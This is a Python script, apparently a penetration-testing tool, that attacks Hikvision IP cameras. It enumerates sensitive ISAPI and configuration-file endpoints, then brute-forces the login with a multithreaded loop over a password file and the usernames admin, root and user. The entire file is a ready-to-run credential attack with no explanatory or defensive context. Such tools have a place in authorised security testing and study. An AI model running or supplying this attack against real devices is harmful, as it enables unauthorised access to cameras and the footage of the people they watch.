import requests
from concurrent.futures import ThreadPoolExecutor

# Target information
TARGET_IP = "192.168.0.135"  # Replace with your Hikvision IP
PORT = 80                    # Default HTTP port for Hikvision
USERNAME_LIST = ["admin", "root", "user"]
PASSWORD_FILE = "/home/kali/Desktop/HistoryFiles/MyPassw0rdList.txt"  # Path to the password file

# Headers for HTTP requests
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

def enumerate_hikvision(ip, port):
    """Enumerate common Hikvision webcam endpoints."""
    try:
        url = f"http://{ip}:{port}"
        endpoints = [
            "/", "/System/configurationFile", "/ISAPI/Security/userCheck",
            "/ISAPI/System/deviceInfo", "/ISAPI/System/network", "/ISAPI/System/version"
        ]

        for endpoint in endpoints:
            full_url = url + endpoint
            try:
                response = requests.get(full_url, headers=HEADERS, timeout=5)
                if response.status_code == 200:
                    print(f"[+] Found endpoint: {full_url}")
                    if "configurationFile" in endpoint:
                        print("[+] Configuration file may be accessible!")
                elif response.status_code == 401:
                    print(f"[!] Authentication required: {full_url}")
                else:
                    print(f"[-] Endpoint not accessible: {full_url}")
            except Exception as e:
                print(f"[-] Error accessing {full_url}: {e}")
    except Exception as e:
        print(f"[-] Error during enumeration: {e}")

def brute_force_hikvision(ip, port, username, password):
    """Brute-force Hikvision webcam login."""
    try:
        url = f"http://{ip}:{port}/ISAPI/Security/userCheck"
        # Encode username and password to handle non-ASCII characters
        auth = (username.encode('utf-8').decode('latin-1'), password.encode('utf-8').decode('latin-1'))
        response = requests.get(url, headers=HEADERS, auth=auth, timeout=5)
        if response.status_code == 200 and "userCheck" in response.text:
            print(f"[+] Success! Username: {username}, Password: {password}")
            return True
    except Exception as e:
        print(f"[-] Error during brute-forcing: {e}")
    return False

def load_passwords(password_file):
    """Load passwords from a file."""

    try:
        with open(password_file, "r", encoding="utf-8") as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print(f"[-] Error: Password file '{password_file}' not found.")
        return []

def main():
    print(f"[*] Starting enumeration and brute-forcing on {TARGET_IP}:{PORT}...")

    # Load passwords from file
    passwords = load_passwords(PASSWORD_FILE)
    if not passwords:
        return

    # Enumerate Hikvision endpoints
    print("[*] Enumerating Hikvision endpoints...")
    enumerate_hikvision(TARGET_IP, PORT)

    # Brute-force Hikvision login
    print("[*] Brute-forcing Hikvision login...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        for username in USERNAME_LIST:
            for password in passwords:
                executor.submit(brute_force_hikvision, TARGET_IP, PORT, username, password)

    print("[*] Enumeration and brute-forcing completed.")

if __name__ == "__main__":
    main()
